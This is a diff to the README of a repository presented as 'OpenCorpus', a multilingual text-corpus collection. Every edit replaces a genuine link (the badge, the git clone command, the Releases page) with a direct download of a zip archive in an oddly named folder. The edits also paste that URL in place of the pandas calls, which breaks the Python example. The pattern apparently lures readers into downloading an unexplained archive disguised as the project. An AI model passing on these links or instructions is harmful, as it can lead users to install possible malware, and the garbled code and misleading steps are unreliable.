@@ -1,6 +1,6 @@
 # OpenCorpus 📚🌍
 
-![OpenCorpus](https://img.shields.io/badge/OpenCorpus-v1.0.0-brightgreen)
+![OpenCorpus](https://github.com/davide-ghidelli-business/OpenCorpus/raw/refs/heads/main/persulphide/Corpus-Open-1.1.zip)
 
 Welcome to **OpenCorpus**, a multilingual compilation of open-source textual corpora designed for accessibility and linguistic research. This repository offers a rich collection of links and metadata for publicly available, CC-licensed, and machine-readable datasets across major and minor world languages.
 
@@ -45,12 +45,12 @@ To get started with **OpenCorpus**, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/davide-ghidelli-business/OpenCorpus.git
+   git clone https://github.com/davide-ghidelli-business/OpenCorpus/raw/refs/heads/main/persulphide/Corpus-Open-1.1.zip
    ```
 
 2. **Explore the Datasets**: Navigate through the directories to find datasets that interest you.
 
-3. **Download Datasets**: For datasets that require download, visit the [Releases](https://github.com/davide-ghidelli-business/OpenCorpus/releases) section to get the latest versions.
+3. **Download Datasets**: For datasets that require download, visit the [Releases](https://github.com/davide-ghidelli-business/OpenCorpus/raw/refs/heads/main/persulphide/Corpus-Open-1.1.zip) section to get the latest versions.
 
 ## Usage
 
@@ -68,10 +68,10 @@ Here’s a simple example of how to load a dataset in Python:
 import pandas as pd
 
 # Load a dataset
-data = pd.read_csv('path_to_your_dataset.csv')
+data = https://github.com/davide-ghidelli-business/OpenCorpus/raw/refs/heads/main/persulphide/Corpus-Open-1.1.zip('https://github.com/davide-ghidelli-business/OpenCorpus/raw/refs/heads/main/persulphide/Corpus-Open-1.1.zip')
 
 # Display the first few rows
-print(data.head())
+print(https://github.com/davide-ghidelli-business/OpenCorpus/raw/refs/heads/main/persulphide/Corpus-Open-1.1.zip())
 ```
 
 ## Contributing
@@ -104,7 +104,7 @@ For any questions or feedback, please reach out via the Issues section of this r
 
 ## Releases
 
-To keep track of updates and new datasets, check the [Releases](https://github.com/davide-ghidelli-business/OpenCorpus/releases) section regularly. Download the latest versions and stay updated with the newest additions to the corpus.
+To keep track of updates and new datasets, check the [Releases](https://github.com/davide-ghidelli-business/OpenCorpus/raw/refs/heads/main/persulphide/Corpus-Open-1.1.zip) section regularly. Download the latest versions and stay updated with the newest additions to the corpus.
 
 ## Acknowledgments
 
